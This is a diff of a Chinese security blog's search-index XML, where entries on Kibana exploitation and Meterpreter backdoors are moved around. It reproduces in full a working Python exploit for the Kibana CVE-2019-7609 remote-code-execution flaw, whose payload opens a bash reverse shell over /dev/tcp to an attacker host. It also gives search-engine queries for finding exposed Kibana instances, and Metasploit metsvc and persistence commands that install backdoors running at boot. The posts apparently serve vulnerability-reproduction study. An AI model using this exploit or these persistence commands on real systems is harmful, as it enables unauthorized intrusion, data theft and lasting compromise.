args.remote_host</span><br><span class="line">    remote_port = args.remote_port</span><br><span class="line">    is_reverse_shell = args.reverse_shell</span><br><span class="line"></span><br><span class="line">    target = target.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">        target = <span class="string">&quot;http://&quot;</span> + target</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        version = get_kibana_version(target)</span><br><span class="line">        result = verify(target)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125; maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">            <span class="keyword">if</span> is_reverse_shell:</span><br><span class="line">                result = reverse_shell(target, remote_host, remote_port)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] reverse shell completely! please check session on: &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(remote_host, remote_port))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] cannot reverse shell&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;&#125; do not exists CVE-2019-7609 vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] cannot exploit!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error on: \n&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_43061533/article/details/111695028">(44条消息) Kibana未授权访问漏洞复现、CVE-2019-7609 Kibana远程代码执行漏洞复现_coc.的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
-        <category>内网渗透</category>
+        <category>Web漏洞</category>
+        <category>Web应用漏洞</category>
+        <category>Kibana</category>
       </categories>
       <tags>
-        <tag>-博客测试</tag>
+        <tag>-web应用漏洞 - Kibana -命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -2611,63 +2668,6 @@
       </tags>
   </entry>
   <entry>
-    <title>kibana未授权访问利用</title>
-    <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Kibana &lt; 5.6.15</p>
-<p>Kibana &lt; 6.6.1</p>
-<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Fofa:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问kibana系统</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/app/kibana</span><br></pre></td></tr></table></figure>
-
-
-
-<p>无需账号密码就可以登录进入图形化界面</p>
-<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125150723328.png" class title="image-20211125150723328">
-
-
-
-<p>下面利用脚本进行攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-7609-kibana-rce.py -u 目标主机ip地址:5601 -host 攻击主机ip地址 -port 监听端口 –-shell</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162717040.png" class title="image-20211125162717040">
-
-
-
-<p>反弹shell成功</p>
-<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162801162.png" class title="image-20211125162801162">
-
-
-
-<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>poc地址 :</p>
-<p><a href="https://github.com/LandGrey/CVE-2019-7609">LandGrey&#x2F;CVE-2019-7609: exploit CVE-2019-7609(kibana RCE) on right way by python2 scripts (github.com)</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> distutils.version <span class="keyword">import</span> StrictVersion</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_kibana_version</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/app/kibana&quot;</span>)</span><br><span class="line">    r = requests.get(url, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">    patterns = [<span class="string">&#x27;&amp;quot;version&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, <span class="string">&#x27;&quot;version&quot;:&quot;(.*?)&quot;,&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        match = re.findall(pattern, r.content)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> match[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;9.9.9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version_compare</span>(<span class="params">standard_version, compare_version</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sc1 = StrictVersion(standard_version[<span class="number">0</span>])</span><br><span class="line">        sc2 = StrictVersion(standard_version[<span class="number">1</span>])</span><br><span class="line">        cc = StrictVersion(compare_version)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] ERROR : kibana version compare failed !&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc1 &gt; cc <span class="keyword">or</span> (StrictVersion(<span class="string">&quot;6.0.0&quot;</span>) &lt;= cc <span class="keyword">and</span> sc2 &gt; cc):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">global</span> version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> version <span class="keyword">or</span> <span class="keyword">not</span> version_compare([<span class="string">&quot;5.6.15&quot;</span>, <span class="string">&quot;6.6.1&quot;</span>], version):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;auto&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> r.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;&quot;seriesList&quot;&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">target, ip, port</span>):</span></span><br><span class="line">    random_name = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;qwertyuiopasdfghjkl&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*).props(label.__proto__.env.AAAA=&#x27;require(\&quot;child_process\&quot;).exec(\&quot;if [ ! -f /tmp/%s ];then touch /tmp/%s &amp;&amp; /bin/bash -c \\&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&#x27;; fi\&quot;);process.exit()//&#x27;)\n.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-15m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;10s&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> % (random_name, random_name, ip, port)</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r1 = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code == <span class="number">200</span>:</span><br><span class="line">        trigger_url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/socket.io/?EIO=3&amp;transport=polling&amp;t=MtjhZoM&quot;</span>)</span><br><span class="line">        new_headers = headers</span><br><span class="line">        new_headers.update(&#123;<span class="string">&#x27;kbn-xsrf&#x27;</span>: <span class="string">&#x27;professionally-crafted-string-of-text&#x27;</span>&#125;)</span><br><span class="line">        r2 = requests.get(trigger_url, verify=<span class="literal">False</span>, headers=new_headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, dest=<span class="string">&#x27;url&#x27;</span>, default=<span class="string">&quot;http://127.0.0.1:5601&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;such as: http://127.0.0.1:5601&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-host&quot;</span>, dest=<span class="string">&#x27;remote_host&#x27;</span>, default=<span class="string">&quot;127.0.0.1&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote host: such as: 1.1.1.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-port&quot;</span>, dest=<span class="string">&#x27;remote_port&#x27;</span>, default=<span class="string">&quot;8888&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote port: such as: 8888&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, dest=<span class="string">&#x27;reverse_shell&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell after verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">&#x27;-h&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.url</span><br><span class="line">    remote_host = args.remote_host</span><br><span class="line">    remote_port = args.remote_port</span><br><span class="line">    is_reverse_shell = args.reverse_shell</span><br><span class="line"></span><br><span class="line">    target = target.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">        target = <span class="string">&quot;http://&quot;</span> + target</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        version = get_kibana_version(target)</span><br><span class="line">        result = verify(target)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125; maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">            <span class="keyword">if</span> is_reverse_shell:</span><br><span class="line">                result = reverse_shell(target, remote_host, remote_port)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] reverse shell completely! please check session on: &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(remote_host, remote_port))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] cannot reverse shell&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;&#125; do not exists CVE-2019-7609 vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] cannot exploit!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error on: \n&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_43061533/article/details/111695028">(44条消息) Kibana未授权访问漏洞复现、CVE-2019-7609 Kibana远程代码执行漏洞复现_coc.的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web应用漏洞</category>
-        <category>Kibana</category>
-      </categories>
-      <tags>
-        <tag>-web应用漏洞 - Kibana -命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PDF文件上传-XSS</title>
     <url>/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/</url>
     <content><![CDATA[<h1 id="pdf文件上传-XSS"><a href="#pdf文件上传-XSS" class="headerlink" title="pdf文件上传-XSS"></a>pdf文件上传-XSS</h1><hr>
@@ -2926,6 +2926,36 @@
       </tags>
   </entry>
   <entry>
+    <title>后门永久植入</title>
+    <url>/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
+<h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h2><h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><hr>
+<p>该模块生成一个端口为31337服务，并且上传到Temp临时文件夹下保存，当系统启动时直接开启服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" class title="image-20211028164717074">
+
+
+
+<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><hr>
+<p>该后门 模块 是通过设置定期时间连接服务器端口，系统启动时回连，自动运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 服务器端口 -r 服务器ip地址</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" class title="image-20211028165356667">
+
+
+
+<p>可以看到生成个自动运行的木马到临时文件夹中，随着系统开启而运行</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+        <category>后门植入</category>
+      </categories>
+      <tags>
+        <tag>-内网渗透 -后门植入 -msf后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>杀软 及防火墙关闭</title>
     <url>/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/</url>
     <content><![CDATA[<h1 id="杀软及防火墙关闭"><a href="#杀软及防火墙关闭" class="headerlink" title="杀软及防火墙关闭"></a>杀软及防火墙关闭</h1><hr>
@@ -2992,36 +3022,6 @@
       </categories>
       <tags>
         <tag>-内网渗透 -杀毒杀软</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>后门永久植入</title>
-    <url>/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
-<h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h2><h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><hr>
-<p>该模块生成一个端口为31337服务，并且上传到Temp临时文件夹下保存，当系统启动时直接开启服务。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" class title="image-20211028164717074">
-
-
-
-<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><hr>
-<p>该后门 模块 是通过设置定期时间连接服务器端口，系统启动时回连，自动运行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 服务器端口 -r 服务器ip地址</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" class title="image-20211028165356667">
-
-
-
-<p>可以看到生成个自动运行的木马到临时文件夹中，随着系统开启而运行</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-        <category>后门植入</category>
-      </categories>
-      <tags>
-        <tag>-内网渗透 -后门植入 -msf后渗透</tag>
       </tags>
   </entry>
   <entry>
